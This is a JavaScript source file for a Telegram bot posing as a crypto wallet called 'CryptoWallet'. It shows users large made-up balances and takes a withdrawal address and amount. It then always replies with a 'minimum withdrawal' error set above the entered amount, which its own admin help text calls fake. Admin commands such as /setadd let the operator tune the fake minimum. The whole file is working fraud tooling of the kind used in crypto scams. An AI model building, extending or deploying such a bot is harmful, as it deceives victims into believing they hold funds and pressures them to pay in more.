const { Telegraf, Markup, session } = require("telegraf");
const { getAdjustment, setAdjustment, applyAdjustment } = require("./store");

const COINS = [
  { id: "solana", name: "Solana", balance: 90888, emoji: "🟣" },
  { id: "usdt", name: "USDT (Solana)", balance: 1300349, emoji: "💚" },
  { id: "dai", name: "DAI", balance: 70000, emoji: "🟡" },
  { id: "eth", name: "ETH", balance: 388000, emoji: "🔵" },
];

function fmt(n) {
  return "$" + Number(n).toLocaleString("en-US");
}

/** Returns true if the sender is the configured admin. */
function isAdmin(ctx) {
  const adminId = process.env.ADMIN_ID;
  if (!adminId) return false;
  return String(ctx.from.id) === String(adminId);
}

/** Human-readable description of current adjustment. */
function adjLabel() {
  const adj = getAdjustment();
  if (!adj) return "Default (+$4,200)";
  if (/^\d+(\.\d+)?x$/i.test(adj)) return `Multiply ×${parseFloat(adj)}`;
  const n = parseFloat(adj.replace(/^\+/, ""));
  return `Add +${fmt(n)}`;
}

function createBot(token) {
  const bot = new Telegraf(token);

  if (!globalThis.__sessionStore) {
    globalThis.__sessionStore = new Map();
  }
  bot.use(
    session({
      store: {
        get: (key) => globalThis.__sessionStore.get(key) || {},
        set: (key, val) => globalThis.__sessionStore.set(key, val),
        delete: (key) => globalThis.__sessionStore.delete(key),
      },
    })
  );

  // ─── Keyboards ────────────────────────────────────────────────────────────

  const coinKeyboard = Markup.inlineKeyboard(
    COINS.map((c) =>
      Markup.button.callback(
        `${c.emoji} ${c.name} – ${fmt(c.balance)}`,
        `coin_${c.id}`
      )
    ),
    { columns: 2 }
  );

  const cancelKeyboard = Markup.inlineKeyboard([
    Markup.button.callback("❌ Cancel", "cancel"),
  ]);

  const retryKeyboard = Markup.inlineKeyboard([
    Markup.button.callback("🔄 Try Again", "try_again"),
    Markup.button.callback("❌ Cancel", "cancel"),
  ]);

  // ─── /start ───────────────────────────────────────────────────────────────

  bot.start((ctx) => {
    ctx.session = {};
    ctx.reply("💼 *Welcome to CryptoWallet!*\n\nSelect a coin to withdraw:", {
      parse_mode: "Markdown",
      ...coinKeyboard,
    });
  });

  // ─── /setadd (admin only) ─────────────────────────────────────────────────
  // Usage:
  //   /setadd 400    → adds +400 to entered amount
  //   /setadd 2x     → multiplies entered amount by 2
  //   /setadd 3x     → multiplies entered amount by 3

  bot.command("setadd", async (ctx) => {
    if (!isAdmin(ctx)) {
      return ctx.reply("⛔ You are not authorized to use this command.");
    }

    const parts = ctx.message.text.trim().split(/\s+/);
    const raw = parts[1];

    if (!raw) {
      return ctx.reply(
        "❌ Usage:\n`/setadd 400` — add +400\n`/setadd 2x` — multiply by 2",
        { parse_mode: "Markdown" }
      );
    }

    // Multiply mode: e.g. 2x, 3x, 2.5x
    if (/^\d+(\.\d+)?x$/i.test(raw)) {
      const stored = raw.toLowerCase(); // store as "2x"
      setAdjustment(stored);
      return ctx.reply(
        `✅ Adjustment set: *Multiply ×${parseFloat(stored)}*\n\nUsers entering any amount will see: amount × ${parseFloat(stored)}`,
        { parse_mode: "Markdown" }
      );
    }

    // Add mode: e.g. 400 or 4200
    const num = parseFloat(raw.replace(/[$,+]/g, ""));
    if (isNaN(num) || num < 0) {
      return ctx.reply(
        "❌ Invalid value. Use a number (e.g. `400`) or multiplier (e.g. `2x`).",
        { parse_mode: "Markdown" }
      );
    }

    const stored = `+${num}`;
    setAdjustment(stored);
    return ctx.reply(
      `✅ Adjustment set: *Add +${fmt(num)}*\n\nUsers entering any amount will see: amount + ${fmt(num)}`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── /amount ──────────────────────────────────────────────────────────────

  bot.command("amount", async (ctx) => {
    if (!isAdmin(ctx)) {
      return ctx.reply("⛔ You are not authorized to use this command.");
    }

    const adj = getAdjustment();
    if (!adj) {
      return ctx.reply(
        "ℹ️ No adjustment set.\nCurrently using default: *+$4,200*\n\nUse `/setadd <value>` to change it.",
        { parse_mode: "Markdown" }
      );
    }
    return ctx.reply(
      `📊 *Current Adjustment*\n\n${adjLabel()}\n\nStored value: \`${adj}\``,
      { parse_mode: "Markdown" }
    );
  });

  // ─── /help (admin only) ───────────────────────────────────────────────────

  bot.command("help", async (ctx) => {
    if (!isAdmin(ctx)) {
      return ctx.reply("⛔ You are not authorized to use this command.");
    }

    const helpText = `
🤖 *Admin Command Reference*

━━━━━━━━━━━━━━━━━━━━━
👤 *User Commands*
━━━━━━━━━━━━━━━━━━━━━

/start
  → Shows the coin selection menu.
     User picks a coin, enters wallet address,
     then enters a withdrawal amount.
     Bot replies with a fake "minimum withdrawal"
     error using the active adjustment.

━━━━━━━━━━━━━━━━━━━━━
🔐 *Admin Commands*
━━━━━━━━━━━━━━━━━━━━━

/setadd <value>
  → Set the adjustment applied to any amount a user enters.
  
  Examples:
  • \`/setadd 400\`   → shows amount + $400
  • \`/setadd 4200\`  → shows amount + $4,200
  • \`/setadd 2x\`    → shows amount × 2
  • \`/setadd 3x\`    → shows amount × 3
  • \`/setadd 2.5x\`  → shows amount × 2.5

  ⚠️ Only one adjustment is active at a time.
     Setting a new value replaces the old one.
     (Stored in: data/settings.json)

/amount
  → Shows the currently active adjustment value.

/help
  → Shows this help message.

━━━━━━━━━━━━━━━━━━━━━
⚙️ *Current Config*
━━━━━━━━━━━━━━━━━━━━━
Active adjustment: *${adjLabel()}*
    `.trim();

    return ctx.reply(helpText, { parse_mode: "Markdown" });
  });

  // ─── Coin selection ───────────────────────────────────────────────────────

  bot.action(/coin_(.+)/, async (ctx) => {
    const coinId = ctx.match[1];
    const coin = COINS.find((c) => c.id === coinId);
    if (!coin) return ctx.answerCbQuery("Invalid coin");

    ctx.session.coin = coin;

    await ctx.editMessageText(
      `Wallet balance: *${fmt(coin.balance)}* available.\n\nPlease send the address on which you want to withdraw funds:`,
      { parse_mode: "Markdown", ...cancelKeyboard }
    );
  });

  // ─── Cancel ───────────────────────────────────────────────────────────────

  bot.action("cancel", async (ctx) => {
    ctx.session = {};
    await ctx.editMessageText("Operation cancelled. Use /start to begin again.");
  });

  // ─── Try Again ────────────────────────────────────────────────────────────

  bot.action("try_again", async (ctx) => {
    await ctx.editMessageText("💰 Enter withdrawal amount in USD:", cancelKeyboard);
  });

  // ─── Text handler (address → amount flow) ─────────────────────────────────

  bot.on("text", async (ctx) => {
    // Ignore messages that are commands (handled above)
    if (ctx.message.text.startsWith("/")) return;

    if (!ctx.session.coin) {
      return ctx.reply("Please start with /start first.");
    }

    if (!ctx.session.address) {
      ctx.session.address = ctx.message.text;
      return ctx.reply("💰 Enter withdrawal amount in USD:", cancelKeyboard);
    }

    const cleaned = ctx.message.text.replace(/[,/$]/g, "");
    const amount = parseFloat(cleaned);

    if (isNaN(amount) || amount <= 0) {
      return ctx.reply("❌ Please enter a valid amount.");
    }

    const fakeMin = applyAdjustment(amount);

    await ctx.reply(
      `❌ *Minimum withdrawal amount is ${fmt(fakeMin)}.*`,
      { parse_mode: "Markdown", ...retryKeyboard }
    );
  });

  return bot;
}

module.exports = { createBot, COINS, fmt };
